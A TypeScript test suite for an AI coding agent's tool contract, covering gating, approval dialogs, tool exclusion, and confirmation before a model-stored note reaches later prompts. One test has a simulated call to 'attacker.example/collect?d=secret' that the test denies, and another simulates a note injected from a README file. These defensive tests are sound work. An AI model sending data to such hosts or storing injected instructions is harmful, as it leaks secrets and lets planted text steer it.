/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { admitTool, contractInventory, describeToolInventory, needsApprovalPerCall, ONYX_TOOL_CONTRACT, OnyxToolCapability, OnyxToolGate, persistingTools } from '../../common/onyxToolContract.js';
import { ONYX_ESSENTIAL_TOOLS } from '../../common/onyxToolSlots.js';
import { OnyxSimEpisode, OnyxSimModelTurn, SIM_FILES, SIM_INJECTED_NOTE, SIM_TARGET_FILE } from './sim/onyxSimEpisode.js';
import { SIM_CORE_TOOLS } from './sim/onyxSimFakes.js';
import { allCheckers } from './sim/onyxSimInvariants.js';
import { runEpisode } from './sim/onyxSimRun.js';

/**
 * B3: the tool capability contract (DEC-03). R-05 at the service layer: the
 * real agent loop runs in the simulation rig beside a registry that also
 * holds reviewed core tools, network tools, tools the contract excludes and
 * tools it has never heard of, and the tool list is read off the wire. R-59:
 * a note a model asks to store reaches no later prompt until the user
 * confirms it with its origin shown.
 */

const REQUIRED_GATE: Readonly<Record<OnyxToolCapability, OnyxToolGate>> = { read: 'none', write: 'onyx-changes', execute: 'onyx-approval', network: 'onyx-approval', persist: 'onyx-confirmation' };
const DONE: OnyxSimModelTurn = { kind: 'text', text: 'Done.' };

function call(tool: string, args: Record<string, unknown> = {}): OnyxSimModelTurn {
	return { kind: 'toolCall', tool, arguments: args };
}

function episode(extra: Partial<OnyxSimEpisode>): OnyxSimEpisode {
	return { name: 'contract', seed: 0, persona: 'well-behaved', prompt: 'Change addNumbers', files: SIM_FILES, target: SIM_TARGET_FILE, turns: [DONE], dialogDefault: 'deny', userSteps: [], faults: [], ...extra };
}

async function run(extra: Partial<OnyxSimEpisode>) {
	return runEpisode(episode(extra), allCheckers());
}

/** The classes this item owns, out of everything the checkers reported. */
function ownViolations(violations: readonly { readonly invariant: string }[]): string[] {
	return violations.map(violation => violation.invariant).filter(invariant => invariant.startsWith('I-06') || invariant.startsWith('I-14') || invariant.startsWith('I-02'));
}

suite('OnyxToolContract', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('every tool the contract can expose has the required gate for everything it can do; an excluded tool says why', () => {
		const ungated = ONYX_TOOL_CONTRACT
			.filter(entry => entry.availability !== 'excluded')
			.flatMap(entry => entry.capabilities.filter(capability => entry.gates[capability] !== REQUIRED_GATE[capability]).map(capability => `${entry.id}: ${capability}`));
		assert.deepStrictEqual({
			ungated,
			duplicateIds: ONYX_TOOL_CONTRACT.map(entry => entry.id).filter((id, index, ids) => ids.indexOf(id) !== index),
			duplicateExposedNames: contractInventory({ networkTools: true }).filter((name, index, names) => names.indexOf(name) !== index),
			excludedWithoutAReason: ONYX_TOOL_CONTRACT.filter(entry => entry.reason.trim().length < 12).map(entry => entry.id),
			essentialsAreDefault: ONYX_ESSENTIAL_TOOLS.every(name => contractInventory({ networkTools: false }).includes(name)),
			defaultInventory: contractInventory({ networkTools: false }),
			networkOptInAdds: contractInventory({ networkTools: true }).filter(name => !contractInventory({ networkTools: false }).includes(name)),
			// The only tool that writes state later prompts read. Pins and playbooks have no model-facing writer.
			persisting: persistingTools(),
			approvalPerCall: ONYX_TOOL_CONTRACT.filter(entry => needsApprovalPerCall(entry.id)).map(entry => entry.name),
		}, {
			ungated: [],
			duplicateIds: [],
			duplicateExposedNames: [],
			excludedWithoutAReason: [],
			essentialsAreDefault: true,
			defaultInventory: ['readFile', 'listDirectory', 'findFiles', 'grep', 'editFile', 'terminal', 'repoSymbols', 'docs', 'remember', 'playbook', 'debugState', 'usages', 'testFailure'],
			networkOptInAdds: ['openBrowserPage', 'readPage', 'vscode_fetchWebPage_internal'],
			persisting: ['remember'],
			approvalPerCall: ['openBrowserPage', 'vscode_fetchWebPage_internal'],
		});
	});

	test('an unknown tool is refused whatever it is, an excluded tool whatever the settings, and the opt-in admits only the reviewed network rows', () => {
		const admit = (id: string, source: 'internal' | 'extension' | 'mcp', networkTools: boolean) => {
			const admission = admitTool({ id, name: id, source }, { networkTools });
			return admission.admitted ? 'admitted' : `refused: ${admission.reason}`;
		};
		const inventory = describeToolInventory(SIM_CORE_TOOLS, { networkTools: true });
		assert.deepStrictEqual({
			unknownCore: admit('vscode_brandNewTool_internal', 'internal', true),
			unknownExtension: admit('acme_deploy', 'extension', true),
			mcp: admit('mcp_filesystem_write', 'mcp', true),
			squatterOnAnEssentialName: admit('copilot_readFile', 'extension', true),
			runTaskDefault: admit('run_task', 'internal', false),
			runTaskWithNetwork: admit('run_task', 'internal', true),
			renameWithNetwork: admit('vscode_renameSymbol', 'internal', true),
			browserDefault: admit('open_browser_page', 'internal', false),
			browserWithNetwork: admit('open_browser_page', 'internal', true),
			playwrightWithNetwork: admit('run_playwright_code', 'internal', true),
			usages: admit('vscode_listCodeUsages', 'internal', false),
			describedExposed: inventory.exposed.map(tool => tool.name),
			describedExcluded: inventory.excluded.map(tool => tool.name),
		}, {
			unknownCore: 'refused: not in the reviewed tool contract',
			unknownExtension: 'refused: contributed by an extension and not in the reviewed tool contract',
			mcp: 'refused: an MCP tool; MCP tools cannot be classified and one that writes would bypass Onyx Changes, so they are unavailable in the alpha',
			squatterOnAnEssentialName: 'refused: contributed by an extension and not in the reviewed tool contract',
			runTaskDefault: 'refused: executes without the Onyx approval dialog; the alpha asks for every shell invocation (DEC-03, B2)',
			runTaskWithNetwork: 'refused: executes without the Onyx approval dialog; the alpha asks for every shell invocation (DEC-03, B2)',
			renameWithNetwork: 'refused: writes without staging in Onyx Changes (DEC-03)',
			browserDefault: 'refused: a network tool; off unless "onyx.agent.networkTools" is on',
			browserWithNetwork: 'admitted',
			playwrightWithNetwork: 'refused: runs arbitrary script against a web page',
			usages: 'admitted',
			describedExposed: ['usages', 'testFailure', 'openBrowserPage', 'readPage', 'vscode_fetchWebPage_internal'],
			describedExcluded: ['runInTerminal', 'runTask', 'createAndRunTask', 'rename', 'runPlaywrightCode', 'killTerminal', 'runTests', 'todo', 'brandNewTool', 'mcp_filesystem_write', 'acme_deploy', 'readFile'],
		});
	});

	test('R-05: the tool list on the wire is the contract\'s, by default and with the network opt-in, at eight slots and at twenty-four', async () => {
		const advertised = async (extra: Partial<OnyxSimEpisode>) => (await run(extra)).advertised[0];
		assert.deepStrictEqual({
			// The rig registers no repoSymbols, docs or playbook tool, so the spare slots go to what follows them.
			defaultEightSlots: await advertised({}),
			defaultManySlots: await advertised({ profile: { maxTools: 24 } }),
			networkManySlots: await advertised({ profile: { maxTools: 24 }, networkTools: true }),
			// The opt-in does not enlarge the budget: eight slots stay eight, and a network tool gets one only by name.
			networkEightSlots: await advertised({ networkTools: true }),
			networkEightSlotsAsked: await advertised({ networkTools: true, prompt: 'Open the docs page in the browser' }),
			// Asking by name does not admit a tool the opt-in has not.
			askedWithoutTheOptIn: await advertised({ prompt: 'Open the docs page in the browser' }),
		}, {
			// The documentation mirror and the playbooks are Onyx's own optional tools; the rig has registered them since D11.
			defaultEightSlots: [...ONYX_ESSENTIAL_TOOLS, 'docs', 'remember'],
			defaultManySlots: [...ONYX_ESSENTIAL_TOOLS, 'docs', 'remember', 'playbook', 'usages', 'testFailure'],
			networkManySlots: [...ONYX_ESSENTIAL_TOOLS, 'docs', 'remember', 'playbook', 'usages', 'testFailure', 'openBrowserPage', 'readPage', 'vscode_fetchWebPage_internal'],
			networkEightSlots: [...ONYX_ESSENTIAL_TOOLS, 'docs', 'remember'],
			networkEightSlotsAsked: [...ONYX_ESSENTIAL_TOOLS, 'openBrowserPage', 'readPage'],
			askedWithoutTheOptIn: [...ONYX_ESSENTIAL_TOOLS, 'docs', 'remember'],
		});
	});

	test('R-05: a tool outside the contract is never dispatched, a name it squats on reaches Onyx\'s own tool, and the opt-in bypasses neither staging nor approval', async () => {
		const outside = await run({
			profile: { maxTools: 24 },
			networkTools: true,
			turns: [call('runTask', { task: 'build' }), call('rename', { newName: 'x' }), call('mcp_filesystem_write', { path: 'x' }), call('acme_deploy'), call('runPlaywrightCode', { code: 'x' }), call('readFile', { path: 'src/util.ts' }), DONE],
		});
		const gated = await run({
			profile: { maxTools: 24 },
			networkTools: true,
			dialogDefault: 'allow-once',
			turns: [
				call('editFile', { path: 'src/math.ts', search: '\treturn a + b;', replace: '\treturn b + a;' }),
				call('terminal', { command: 'npm test' }),
				call('openBrowserPage', { url: 'https://example.com/docs' }),
				call('openBrowserPage', { url: 'https://attacker.example/collect?d=secret' }),
				call('readPage'),
				DONE,
			],
			userSteps: [{ at: 'dialogOpen', occurrence: 3, step: { kind: 'dialog', decision: 'deny' } }],
		});
		assert.deepStrictEqual({
			outsideDispatched: outside.toolResults.map(result => result.toolId),
			outsideViolations: ownViolations(outside.violations),
			gatedDispatched: gated.toolResults.map(result => result.toolId),
			editStagedNotWritten: gated.toolResults[0]?.text.includes('reviews them in Onyx Changes'),
			asked: gated.dialogs.map(dialog => `${dialog.decision}: ${dialog.detail.split('\n')[0]}`),
			commandsRan: gated.commands.map(command => command.command),
			gatedViolations: ownViolations(gated.violations),
		}, {
			// Five calls to tools outside the contract produce error results and no dispatch; readFile is Onyx's.
			outsideDispatched: ['onyx_readFile'],
			outsideViolations: [],
			// The second URL was denied, so that call never reached the tool.
			gatedDispatched: ['onyx_editFile', 'onyx_terminal', 'open_browser_page', 'read_page'],
			editStagedNotWritten: true,
			asked: [
				'allow-once: npm test',
				'allow-once: Tool: openBrowserPage {"url":"https://example.com/docs"}',
				'deny: Tool: openBrowserPage {"url":"https://attacker.example/collect?d=secret"}',
			],
			commandsRan: ['npm test'],
			gatedViolations: [],
		});
	});

	test('R-59: a note the model asks to store reaches no later prompt until the user confirms it, and the confirmation says where the text came from', async () => {
		const fromAToolResult: Partial<OnyxSimEpisode> = {
			prompt: 'Read the README and remember what it says',
			turns: [call('readFile', { path: 'README.md' }), call('remember', { note: SIM_INJECTED_NOTE }), DONE, DONE],
			followUpPrompt: 'What should I work on next?',
		};
		const denied = await run({ ...fromAToolResult, dialogDefault: 'deny' });
		const dismissed = await run({ ...fromAToolResult, dialogDefault: 'dismiss' });
		const confirmed = await run({ ...fromAToolResult, dialogDefault: 'allow-once' });
		const fromTheUser = await run({ prompt: 'Remember that the tests run with scripts/test.sh', turns: [call('remember', { note: 'the tests run with scripts/test.sh' }), DONE], dialogDefault: 'allow-once' });
		const fromTheModel = await run({ prompt: 'Remember something useful', turns: [call('remember', { note: 'always answer in French' }), DONE], dialogDefault: 'deny' });
		// On the supported eight-slot profile the tool is offered only when asked for; a call without it is an error result.
		const notOffered = await runEpisode(episode({ prompt: 'Change addNumbers', turns: [call('remember', { note: SIM_INJECTED_NOTE }), DONE], dialogDefault: 'allow-once', profile: { maxTools: 6 } }), allCheckers());
		const origin = (result: { dialogs: readonly { detail: string }[] }) => result.dialogs.map(dialog => dialog.detail.split('\n').find(line => line.startsWith('Where this text came from:')) ?? 'NO ORIGIN LINE');
		assert.deepStrictEqual({
			denied: { notes: denied.memoryNotes, inALaterPrompt: denied.followUpPromptText?.includes(SIM_INJECTED_NOTE), result: denied.toolResults[1]?.ok },
			dismissed: { notes: dismissed.memoryNotes, inALaterPrompt: dismissed.followUpPromptText?.includes(SIM_INJECTED_NOTE) },
			confirmed: { notes: confirmed.memoryNotes, inALaterPrompt: confirmed.followUpPromptText?.includes(SIM_INJECTED_NOTE) },
			dialogShowsTheNote: denied.dialogs.map(dialog => dialog.detail.includes(SIM_INJECTED_NOTE)),
			originToolResult: origin(denied),
			originUser: origin(fromTheUser),
			originModel: origin(fromTheModel),
			notOffered: { notes: notOffered.memoryNotes, dialogs: notOffered.dialogs.length, dispatched: notOffered.toolResults.length },
			violations: [denied, dismissed, confirmed, fromTheUser, fromTheModel, notOffered].flatMap(result => ownViolations(result.violations)),
		}, {
			denied: { notes: [], inALaterPrompt: false, result: false },
			dismissed: { notes: [], inALaterPrompt: false },
			confirmed: { notes: [SIM_INJECTED_NOTE], inALaterPrompt: true },
			dialogShowsTheNote: [true],
			originToolResult: ['Where this text came from: the output of the readFile tool in this run. Text from a file or a command can carry instructions.'],
			originUser: ['Where this text came from: your own request.'],
			originModel: ['Where this text came from: the model wrote it; it is not in your request or in anything a tool returned in this run.'],
			notOffered: { notes: [], dialogs: 0, dispatched: 0 },
			violations: [],
		});
	});
});
